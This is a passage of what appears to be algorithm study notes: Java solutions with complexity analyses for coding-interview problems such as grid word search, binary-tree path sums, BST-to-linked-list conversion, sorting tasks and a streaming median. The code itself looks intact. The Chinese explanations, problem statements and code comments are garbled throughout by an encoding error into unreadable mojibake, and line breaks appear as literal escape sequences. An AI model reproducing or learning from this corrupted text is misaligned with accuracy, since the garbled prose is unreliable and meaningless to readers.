ï¼ˆä»£è¡¨åªéœ€æ‰¾åˆ°ä¸€æ¡å¯è¡Œè·¯å¾„å°±ç›´æ¥è¿”å›ï¼Œä¸å†åšåç»­ DFS ï¼‰ï¼Œå¹¶è®°å½•ç»“æœè‡³ `res` ã€‚\n    3.  è¿˜åŸå½“å‰çŸ©é˜µå…ƒç´ ï¼š å°† `board[i][j]` å…ƒç´ è¿˜åŸè‡³åˆå§‹å€¼ï¼Œå³ `word[k]` ã€‚\n-   **è¿”å›å€¼ï¼š** è¿”å›å¸ƒå°”é‡ `res` ï¼Œä»£è¡¨æ˜¯å¦æœç´¢åˆ°ç›®æ ‡å­—ç¬¦ä¸²\n\n```java\nclass Solution {\n    public boolean exist(char[][] board, String word) {\n        char[] words = word.toCharArray();\n        for(int i = 0; i < board.length; i++) {\n            for(int j = 0; j < board[0].length; j++) {\n                if(dfs(board, words, i, j, 0)) return true;\n            }\n        }\n        return false;\n    }\n    boolean dfs(char[][] board, char[] word, int i, int j, int k) {\n        if(i >= board.length || i < 0 || j >= board[0].length || j < 0 || board[i][j] != word[k]) return false;\n        if(k == word.length - 1) return true;\n        board[i][j] = '\\0';\n        boolean res = dfs(board, word, i + 1, j, k + 1) || dfs(board, word, i - 1, j, k + 1) || \n                      dfs(board, word, i, j + 1, k + 1) || dfs(board, word, i , j - 1, k + 1);\n        board[i][j] = word[k];\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n> M,N åˆ†åˆ«ä¸ºçŸ©é˜µè¡Œåˆ—å¤§å°ï¼Œ K ä¸ºå­—ç¬¦ä¸² `word` é•¿åº¦ã€‚\n\n-   **æ—¶é—´å¤æ‚åº¦ O(3<sup>K</sup>MN)ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼Œéœ€è¦éå†çŸ©é˜µä¸­é•¿åº¦ä¸º K å­—ç¬¦ä¸²çš„æ‰€æœ‰æ–¹æ¡ˆï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(3<sup>K</sup>)ï¼›çŸ©é˜µä¸­å…±æœ‰ MN ä¸ªèµ·ç‚¹ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(MN) ã€‚\n    -   **æ–¹æ¡ˆæ•°è®¡ç®—ï¼š** è®¾å­—ç¬¦ä¸²é•¿åº¦ä¸º K ï¼Œæœç´¢ä¸­æ¯ä¸ªå­—ç¬¦æœ‰ä¸Šã€ä¸‹ã€å·¦ã€å³å››ä¸ªæ–¹å‘å¯ä»¥é€‰æ‹©ï¼Œèˆå¼ƒå›å¤´ï¼ˆä¸Šä¸ªå­—ç¬¦ï¼‰çš„æ–¹å‘ï¼Œå‰©ä¸‹ 3 ç§é€‰æ‹©ï¼Œå› æ­¤æ–¹æ¡ˆæ•°çš„å¤æ‚åº¦ä¸º O(3<sup>K</sup>) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(K) ï¼š** æœç´¢è¿‡ç¨‹ä¸­çš„é€’å½’æ·±åº¦ä¸è¶…è¿‡ K ï¼Œå› æ­¤ç³»ç»Ÿå› å‡½æ•°è°ƒç”¨ç´¯è®¡ä½¿ç”¨çš„æ ˆç©ºé—´å ç”¨ O(K) ï¼ˆå› ä¸ºå‡½æ•°è¿”å›åï¼Œç³»ç»Ÿè°ƒç”¨çš„æ ˆç©ºé—´ä¼šé‡Šæ”¾ï¼‰ã€‚æœ€åæƒ…å†µä¸‹ K\\=MNï¼Œé€’å½’æ·±åº¦ä¸º MN ï¼Œæ­¤æ—¶ç³»ç»Ÿæ ˆä½¿ç”¨ O(MN) çš„é¢å¤–ç©ºé—´ã€‚\n\n## 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´\n\n### é¢˜ç›®\n\n>åœ°ä¸Šæœ‰ä¸€ä¸ªmè¡Œnåˆ—çš„æ–¹æ ¼ï¼Œä»åæ ‡ [0,0] åˆ°åæ ‡ [m-1,n-1] ã€‚ä¸€ä¸ªæœºå™¨äººä»åæ ‡ [0, 0] çš„æ ¼å­å¼€å§‹ç§»åŠ¨ï¼Œå®ƒæ¯æ¬¡å¯ä»¥å‘å·¦ã€å³ã€ä¸Šã€ä¸‹ç§»åŠ¨ä¸€æ ¼ï¼ˆä¸èƒ½ç§»åŠ¨åˆ°æ–¹æ ¼å¤–ï¼‰ï¼Œä¹Ÿä¸èƒ½è¿›å…¥è¡Œåæ ‡å’Œåˆ—åæ ‡çš„æ•°ä½ä¹‹å’Œå¤§äºkçš„æ ¼å­ã€‚ä¾‹å¦‚ï¼Œå½“kä¸º18æ—¶ï¼Œæœºå™¨äººèƒ½å¤Ÿè¿›å…¥æ–¹æ ¼ [35, 37] ï¼Œå› ä¸º3+5+3+7=18ã€‚ä½†å®ƒä¸èƒ½è¿›å…¥æ–¹æ ¼ [35, 38]ï¼Œå› ä¸º3+5+3+8=19ã€‚è¯·é—®è¯¥æœºå™¨äººèƒ½å¤Ÿåˆ°è¾¾å¤šå°‘ä¸ªæ ¼å­ï¼Ÿ\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šm = 2, n = 3, k = 1\n>è¾“å‡ºï¼š3\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šm = 3, n = 1, k = 0\n>è¾“å‡ºï¼š1\n>```\n\n### è§£ç­”\n\n```java\nclass Solution {\n    public int movingCount(int m, int n, int k) {\n        // è®°å½•ä½ç½®æ˜¯å¦è¢«éå†è¿‡\n        boolean[][] visited = new boolean[m][n];\n        return dfs(visited, m, n, 0, 0, k);\n    }\n\n    private int dfs(boolean[][] visited, int m, int n, int i, int j, int k) {\n        // i >= m || j >= næ˜¯è¾¹ç•Œæ¡ä»¶çš„åˆ¤æ–­\n        if (i >= m || j >= n\n                // visited[i][j]åˆ¤æ–­è¿™ä¸ªæ ¼å­æ˜¯å¦è¢«è®¿é—®è¿‡\n                || visited[i][j] == true\n                // åˆ¤æ–­å½“å‰æ ¼å­åæ ‡æ˜¯å¦æ»¡è¶³æ¡ä»¶\n                || bitSum(i) + bitSum(j) > k) {\n            return 0;\n        }\n        // æ ‡æ³¨è¿™ä¸ªæ ¼å­è¢«è®¿é—®è¿‡\n        visited[i][j] = true;\n        // æ²¿ç€å½“å‰æ ¼å­çš„å³è¾¹å’Œä¸‹è¾¹ç»§ç»­è®¿é—®\n        //ä»£è¡¨ä»æœ¬å•å…ƒæ ¼é€’å½’æœç´¢çš„å¯è¾¾è§£æ€»æ•°ã€‚\n        return 1 + dfs(visited, m, n, i + 1, j, k) + dfs(visited, m, n, i, j + 1, k);\n    }\n    // è®¡ç®—æ•°ä½å’Œ\n    private int bitSum(int x) {\n        int sum = 0;\n        while(x > 0) {\n            sum += x % 10;\n            x /= 10; \n        }\n        return sum;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(MN) ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼Œæœºå™¨äººéå†çŸ©é˜µæ‰€æœ‰å•å…ƒæ ¼ï¼Œæ­¤æ—¶æ—¶é—´å¤æ‚åº¦ä¸º O(MN) ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(MN)ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼Œ `visited` å†…å­˜å‚¨çŸ©é˜µæ‰€æœ‰å•å…ƒæ ¼çš„ç´¢å¼•ï¼Œä½¿ç”¨ O(MN) çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 15 å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆä¸­ç­‰ï¼‰\n\n## 34. äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„\n\n### é¢˜ç›®\n\n>ç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å’Œ targetSum ï¼Œæ‰¾å‡ºæ‰€æœ‰ ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹è·¯å¾„æ€»å’Œç­‰äºç»™å®šç›®æ ‡å’Œçš„è·¯å¾„ã€‚\n>\n>å¶å­èŠ‚ç‚¹ æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>![](https://img.jwt1399.top/img/202208232302265.jpg)\n>\n>```\n>è¾“å…¥ï¼šroot = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22\n>è¾“å‡ºï¼š[[5,4,11,2],[5,8,4,5]]\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>![](https://img.jwt1399.top/img/202208232302516.jpg)\n>\n>```\n>è¾“å…¥ï¼šroot = [1,2,3], targetSum = 5\n>è¾“å‡ºï¼š[]\n>```\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥ï¼šroot = [1,2], targetSum = 0\n>è¾“å‡ºï¼š[]\n>```\n\n### è§£ç­”\n\n\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n    LinkedList<Integer> path = new LinkedList<>();\n  \tLinkedList<List<Integer>> res = new LinkedList<>();\n    public List<List<Integer>> pathSum(TreeNode root, int target) {\n\t\tdfs(root, target);\n      \treturn res;\n      \n    }\n    private void dfs(TreeNode root, int target){\n      if(root == null) return;\n      path.add(root.val);\n      target -= root.val;\n      if(target == 0 && root.left == null && root.right == null)\n             // ç»†èŠ‚ï¼šä¸ºä»€ä¹ˆæˆ‘è¦é€šè¿‡æ„é€ æ–¹æ³•ä¼ å…¥pathï¼Œä¸èƒ½ç›´æ¥res.add(path)\n            //å› ä¸ºç›´æ¥åŠ å…¥ï¼ŒåŠ å…¥çš„æ˜¯å¼•ç”¨(æŒ‡å‘çš„å †ä¸­æ•°æ®ä¼šå˜åŒ–)ï¼Œéœ€è¦å…‹éš†ä¸€ä»½åŠ å…¥\n         res.add(new LinkedList(path));\n      dfs(root.left, target);\n      dfs(root.right, target);\n      path.removeLast();// å°†æœ¬æ¬¡æœç´¢ç»“æœç§»é™¤ï¼Œæ–¹ä¾¿å…¶ä»–æœç´¢ä½¿ç”¨pathå˜é‡\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°ï¼Œå…ˆåºéå†éœ€è¦éå†æ‰€æœ‰èŠ‚ç‚¹ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼Œå³æ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼Œ`path` å­˜å‚¨æ‰€æœ‰æ ‘èŠ‚ç‚¹ï¼Œä½¿ç”¨ O(N) é¢å¤–ç©ºé—´ã€‚\n\n## 36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œå°†è¯¥äºŒå‰æœç´¢æ ‘è½¬æ¢æˆä¸€ä¸ªæ’åºçš„å¾ªç¯åŒå‘é“¾è¡¨ã€‚è¦æ±‚ä¸èƒ½åˆ›å»ºä»»ä½•æ–°çš„èŠ‚ç‚¹ï¼Œåªèƒ½è°ƒæ•´æ ‘ä¸­èŠ‚ç‚¹æŒ‡é’ˆçš„æŒ‡å‘ã€‚\n>\n>ä¸ºäº†è®©æ‚¨æ›´å¥½åœ°ç†è§£é—®é¢˜ï¼Œä»¥ä¸‹é¢çš„äºŒå‰æœç´¢æ ‘ä¸ºä¾‹ï¼š\n>\n>![](https://img.jwt1399.top/img/202208240010290.png)\n>\n>æˆ‘ä»¬å¸Œæœ›å°†è¿™ä¸ªäºŒå‰æœç´¢æ ‘è½¬åŒ–ä¸ºåŒå‘å¾ªç¯é“¾è¡¨ã€‚é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªå‰é©±å’Œåç»§æŒ‡é’ˆã€‚å¯¹äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„å‰é©±æ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œæœ€åä¸€ä¸ªèŠ‚ç‚¹çš„åç»§æ˜¯ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚\n>\n>ä¸‹å›¾å±•ç¤ºäº†ä¸Šé¢çš„äºŒå‰æœç´¢æ ‘è½¬åŒ–æˆçš„é“¾è¡¨ã€‚â€œheadâ€ è¡¨ç¤ºæŒ‡å‘é“¾è¡¨ä¸­æœ‰æœ€å°å…ƒç´ çš„èŠ‚ç‚¹ã€‚\n>\n>![](https://img.jwt1399.top/img/202208240010148.png)\n>\n>ç‰¹åˆ«åœ°ï¼Œæˆ‘ä»¬å¸Œæœ›å¯ä»¥å°±åœ°å®Œæˆè½¬æ¢æ“ä½œã€‚å½“è½¬åŒ–å®Œæˆä»¥åï¼Œæ ‘ä¸­èŠ‚ç‚¹çš„å·¦æŒ‡é’ˆéœ€è¦æŒ‡å‘å‰é©±ï¼Œæ ‘ä¸­èŠ‚ç‚¹çš„å³æŒ‡é’ˆéœ€è¦æŒ‡å‘åç»§ã€‚è¿˜éœ€è¦è¿”å›é“¾è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆã€‚\n>\n\n###  è§£ç­”\n\nå°†**äºŒå‰æœç´¢æ ‘**è½¬æ¢æˆä¸€ä¸ª â€œ**æ’åºçš„å¾ªç¯åŒå‘é“¾è¡¨**â€ ï¼Œå…¶ä¸­åŒ…å«ä¸‰ä¸ªè¦ç´ ï¼š\n\n1.  **æ’åºé“¾è¡¨ï¼š** äºŒå‰æœç´¢æ ‘çš„ä¸­åºéå†ä¸º **é€’å¢åºåˆ—** ã€‚\n2.  **åŒå‘é“¾è¡¨ï¼š** åœ¨æ„å»ºç›¸é‚»èŠ‚ç‚¹çš„å¼•ç”¨å…³ç³»æ—¶ï¼Œè®¾å‰é©±èŠ‚ç‚¹ `pre` å’Œå½“å‰èŠ‚ç‚¹ `cur` ï¼Œä¸ä»…åº”æ„å»º `pre.right = cur` ï¼Œä¹Ÿåº”æ„å»º `cur.left = pre` ã€‚\n3.  **å¾ªç¯é“¾è¡¨ï¼š** è®¾é“¾è¡¨å¤´èŠ‚ç‚¹ `head` å’Œå°¾èŠ‚ç‚¹ `tail` ï¼Œåˆ™åº”æ„å»º `head.left = tail` å’Œ `tail.right = head` ã€‚\n\n![](https://img.jwt1399.top/img/202208241646204.png)\n\n```java\nclass Solution {\n    Node pre, head;\n    public Node treeToDoublyList(Node root) {\n        if(root == null) return null;\n        dfs(root);\n        head.left = pre;\n        pre.right = head;\n        return head;\n    }\n    void dfs(Node cur){\n      if(cur == null) return;\n      dfs(cur.left);\n      if(pre != null)\n        pre.right = cur;\n      else\n        head = cur;\n      cur.left = pre;\n      pre = cur;\n      dfs(cur.right);\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°ï¼Œä¸­åºéå†éœ€è¦è®¿é—®æ‰€æœ‰èŠ‚ç‚¹ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼Œå³æ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼Œé€’å½’æ·±åº¦è¾¾åˆ° Nï¼Œç³»ç»Ÿä½¿ç”¨ O(N) æ ˆç©ºé—´ã€‚\n\n## 54.äºŒå‰æœç´¢æ ‘çš„ç¬¬kå¤§èŠ‚ç‚¹\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œè¯·æ‰¾å‡ºå…¶ä¸­ç¬¬ k å¤§çš„èŠ‚ç‚¹çš„å€¼ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: root = [3,1,4,null,2], k = 1\n>   3\n>  / \\\n> 1   4\n>  \\\n>   2\n>è¾“å‡º: 4\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: root = [5,3,6,2,4,null,null,1], k = 3\n>       5\n>      / \\\n>     3   6\n>    / \\\n>   2   4\n>  /\n> 1\n>è¾“å‡º: 4\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208241746296.png)\n\n```java\nclass Solution {\n    int count=0, res=0;//å½¢å‚kä¸èƒ½éšç€dfsçš„è¿­ä»£è€Œä¸æ–­å˜åŒ–ï¼Œä¸ºäº†è®°å½•è¿­ä»£è¿›ç¨‹å’Œç»“æœï¼Œå¼•å…¥ç±»å˜é‡countå’Œresã€‚\n    public int kthLargest(TreeNode root, int k) {\n        this.count=k;//åˆ©ç”¨å½¢å‚å€¼kå¯¹ç±»å˜é‡countè¿›è¡Œåˆå§‹åŒ–\n        dfs(root);//è¿™é‡Œä¸è¦å¼•å…¥å½¢å‚kï¼Œdfsä¸­ç›´æ¥ä½¿ç”¨çš„æ˜¯åˆå§‹å€¼ä¸ºkçš„ç±»å˜é‡count\n        return res;            \n    }\n    public void dfs(TreeNode root){ //ä¸­åºéå†çš„å€’åº\n        if(root==null||count==0) return;//å½“rootä¸ºç©ºæˆ–è€…å·²ç»æ‰¾åˆ°äº†resæ—¶ï¼Œç›´æ¥è¿”å›\n        dfs(root.right);\n        if(--count==0){//å…ˆ--ï¼Œå†åˆ¤æ–­\n            res = root.val;\n            return;//è¿™é‡Œçš„returnå¯ä»¥é¿å…ä¹‹åçš„æ— æ•ˆè¿­ä»£dfs(root.left);\n        }\n        dfs(root.left);  \n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** å½“æ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼ˆå…¨éƒ¨ä¸ºå³å­èŠ‚ç‚¹ï¼‰ï¼Œæ— è®º k çš„å€¼å¤§å°ï¼Œé€’å½’æ·±åº¦éƒ½ä¸º N ï¼Œå ç”¨ O(N) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N)ï¼š** å½“æ ‘é€€åŒ–ä¸ºé“¾è¡¨æ—¶ï¼ˆå…¨éƒ¨ä¸ºå³å­èŠ‚ç‚¹ï¼‰ï¼Œç³»ç»Ÿä½¿ç”¨ O(N) å¤§å°çš„æ ˆç©ºé—´ã€‚\n\n# ç¬¬ 16 å¤© æ’åºï¼ˆç®€å•ï¼‰\n\n## 45.æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªéè´Ÿæ•´æ•°æ•°ç»„ï¼ŒæŠŠæ•°ç»„é‡Œæ‰€æœ‰æ•°å­—æ‹¼æ¥èµ·æ¥æ’æˆä¸€ä¸ªæ•°ï¼Œæ‰“å°èƒ½æ‹¼æ¥å‡ºçš„æ‰€æœ‰æ•°å­—ä¸­æœ€å°çš„ä¸€ä¸ªã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: [10,2]\n>è¾“å‡º: \"102\"\n>```\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: [3,30,34,5,9]\n>è¾“å‡º: \"3033459\"\n>```\n\n### è§£ç­”\n\nè®¾æ•°ç»„ nums ä¸­ä»»æ„ä¸¤æ•°å­—çš„å­—ç¬¦ä¸²ä¸º x å’Œ y ï¼Œåˆ™è§„å®š **æ’åºåˆ¤æ–­è§„åˆ™** ä¸ºï¼š\n\n-   è‹¥æ‹¼æ¥å­—ç¬¦ä¸² xy > yx ï¼Œåˆ™ x åº”åœ¨ y å³è¾¹ ï¼›\n-   åä¹‹ï¼Œè‹¥ xy < yxï¼Œåˆ™ x åº”åœ¨ y å·¦è¾¹ ï¼›\n\n```java\nclass Solution {\n    public String minNumber(int[] nums) {\n      String[] strs = new String[nums.length];\n      for(int i = 0; i < nums.length; i++){\n        strs[i] = String.valueOf(nums[i]);\n      }\n      Arrays.sort(strs, (x, y) -> (x + y).compareTo(y + x));\n      StringBuilder res = new StringBuilder();\n      for(String s : strs){\n        res.append(s);\n      }\n      return res.toString();\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(Nlogâ¡N) ï¼š**N ä¸ºæœ€ç»ˆè¿”å›å€¼çš„å­—ç¬¦æ•°é‡ï¼›ä½¿ç”¨å†…ç½®å‡½æ•° Arrays.sort çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(Nlogâ¡N)ï¼Œæœ€å·®ä¸º O(N<sup>2</sup>)ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** å­—ç¬¦ä¸²åˆ—è¡¨ strs å ç”¨çº¿æ€§å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 61. æ‰‘å…‹ç‰Œä¸­çš„é¡ºå­\n\n### é¢˜ç›®\n\n>ä»è‹¥å¹²å‰¯æ‰‘å…‹ç‰Œä¸­éšæœºæŠ½ 5 å¼ ç‰Œï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯ä¸€ä¸ªé¡ºå­ï¼Œå³è¿™5å¼ ç‰Œæ˜¯ä¸æ˜¯è¿ç»­çš„ã€‚2ï½10ä¸ºæ•°å­—æœ¬èº«ï¼ŒAä¸º1ï¼ŒJä¸º11ï¼ŒQä¸º12ï¼ŒKä¸º13ï¼Œè€Œå¤§ã€å°ç‹ä¸º 0 ï¼Œå¯ä»¥çœ‹æˆä»»æ„æ•°å­—ã€‚A ä¸èƒ½è§†ä¸º 14ã€‚\n>\n>ç¤ºä¾‹ 1:\n>\n>```\n>è¾“å…¥: [1,2,3,4,5]\n>è¾“å‡º: True\n>```\n>\n>\n>ç¤ºä¾‹ 2:\n>\n>```\n>è¾“å…¥: [0,0,1,2,5]\n>è¾“å‡º: True\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208271513742.png)\n\n- éå†äº”å¼ ç‰Œï¼Œé‡åˆ°å¤§å°ç‹ï¼ˆå³ 0 ï¼‰ç›´æ¥è·³è¿‡ã€‚\n- åˆ¤åˆ«é‡å¤ï¼š åˆ©ç”¨ Set å®ç°éå†åˆ¤é‡ï¼Œ Set çš„æŸ¥æ‰¾æ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(1) ï¼›\n- è·å–æœ€å¤§ / æœ€å°çš„ç‰Œï¼š å€ŸåŠ©è¾…åŠ©å˜é‡ max å’Œ min ï¼Œéå†ç»Ÿè®¡å³å¯ã€‚\n\n```java\nclass Solution {\n    public boolean isStraight(int[] nums) {\n      Set<Integer> set = new HashSet<>();\n      int max = 0, min = 14;\n      for(int num : nums){\n        if(num == 0) continue; // è·³è¿‡å¤§å°ç‹\n        max = Math.max(max,num);// æœ€å¤§ç‰Œ\n        min = Math.min(min,num);// æœ€å°ç‰Œ\n        if(set.contains(num)) return false; // è‹¥æœ‰é‡å¤ï¼Œæå‰è¿”å› false\n        set.add(num);// æ·»åŠ æ­¤ç‰Œè‡³ Set\n      }\n      return max - min < 5;// æœ€å¤§ç‰Œ - æœ€å°ç‰Œ < 5 åˆ™å¯æ„æˆé¡ºå­\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)\\=O(5)\\=O(1)ï¼š** å…¶ä¸­ N ä¸º nums é•¿åº¦ï¼Œæœ¬é¢˜ä¸­ Nâ‰¡5 ï¼›éå†æ•°ç»„ä½¿ç”¨ O(N) æ—¶é—´ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N)\\=O(5)\\=O(1) ï¼š** ç”¨äºåˆ¤é‡çš„è¾…åŠ© Set ä½¿ç”¨ O(N) é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 17 å¤© æ’åºï¼ˆä¸­ç­‰ï¼‰\n\n## 40. æœ€å°çš„kä¸ªæ•°\n\n### é¢˜ç›®\n\n>è¾“å…¥æ•´æ•°æ•°ç»„ arr ï¼Œæ‰¾å‡ºå…¶ä¸­æœ€å°çš„ k ä¸ªæ•°ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥4ã€5ã€1ã€6ã€2ã€7ã€3ã€8è¿™8ä¸ªæ•°å­—ï¼Œåˆ™æœ€å°çš„4ä¸ªæ•°å­—æ˜¯1ã€2ã€3ã€4ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šarr = [3,2,1], k = 2\n>è¾“å‡ºï¼š[1,2] æˆ–è€… [2,1]\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šarr = [0,1,2,1], k = 1\n>è¾“å‡ºï¼š[0]\n>```\n\n### è§£ç­”\n\n```java\nclass Solution {\n    public int[] getLeastNumbers(int[] arr, int k) {\n      int[] res = new int[k];\n      Arrays.sort(arr);\n      for(int i = 0; i < k; i++){\n        res[i] = arr[i];\n      }\n      return res;\n    }\n}\n\nclass Solution {\n    public int[] getLeastNumbers(int[] arr, int k) {\n        Arrays.sort(arr);\n        return Arrays.copyOf(arr, k);\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(Nlogâ¡N) ï¼š**N ä¸ºæ•°ç»„é•¿åº¦ï¼›ä½¿ç”¨å†…ç½®å‡½æ•° Arrays.sort çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(Nlogâ¡N)ï¼Œæœ€å·®ä¸º O(N<sup>2</sup>)ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** æ•°ç»„å ç”¨çº¿æ€§å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 41. æ•°æ®æµä¸­çš„ä¸­ä½æ•°\n\n### é¢˜ç›®\n\n>å¦‚ä½•å¾—åˆ°ä¸€ä¸ªæ•°æ®æµä¸­çš„ä¸­ä½æ•°ï¼Ÿå¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¥‡æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä½äºä¸­é—´çš„æ•°å€¼ã€‚å¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¶æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä¸­é—´ä¸¤ä¸ªæ•°çš„å¹³å‡å€¼ã€‚\n>\n>ä¾‹å¦‚ï¼Œ\n>\n>[2,3,4] çš„ä¸­ä½æ•°æ˜¯ 3\n>\n>[2,3] çš„ä¸­ä½æ•°æ˜¯ (2 + 3) / 2 = 2.5\n>\n>è®¾è®¡ä¸€ä¸ªæ”¯æŒä»¥ä¸‹ä¸¤ç§æ“ä½œçš„æ•°æ®ç»“æ„ï¼š\n>\n>- void addNum(int num) - ä»æ•°æ®æµä¸­æ·»åŠ ä¸€ä¸ªæ•´æ•°åˆ°æ•°æ®ç»“æ„ä¸­ã€‚\n>- double findMedian() - è¿”å›ç›®å‰æ‰€æœ‰å…ƒç´ çš„ä¸­ä½æ•°ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼š\n>[\"MedianFinder\",\"addNum\",\"addNum\",\"findMedian\",\"addNum\",\"findMedian\"]\n>[[],[1],[2],[],[3],[]]\n>è¾“å‡ºï¼š[null,null,null,1.50000,null,2.00000]\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼š\n>[\"MedianFinder\",\"addNum\",\"findMedian\",\"addNum\",\"findMedian\"]\n>[[],[2],[],[3],[]]\n>è¾“å‡ºï¼š[null,null,2.00000,null,2.50000]\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208281635614.png)\n\n```java\nclass MedianFinder {\n    Queue<Integer> A, B;\n    public MedianFinder() {\n        A = new PriorityQueue<>(); // å°é¡¶å †ï¼Œä¿å­˜è¾ƒå¤§çš„ä¸€åŠ\n        B = new PriorityQueue<>((x, y) -> (y - x)); // å¤§é¡¶å †ï¼Œä¿å­˜è¾ƒå°çš„ä¸€åŠ\n    }\n    public void addNum(int num) {\n        if(A.size() != B.size()) {\n            A.add(num);\n            B.add(A.poll());\n        } else {\n            B.add(num);\n            A.add(B.poll());\n        }\n    }\n    public double findMedian() {\n        return A.size() != B.size() ? A.peek() : (A.peek() + B.peek()) / 2.0;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ï¼š**\n    -   **æŸ¥æ‰¾ä¸­ä½æ•° O(1) ï¼š** è·å–å †é¡¶å…ƒç´ ä½¿ç”¨ O(1)æ—¶é—´ï¼›\n    -   **æ·»åŠ æ•°å­— O(logâ¡N)ï¼š** å †çš„æ’å…¥å’Œå¼¹å‡ºæ“ä½œä½¿ç”¨ 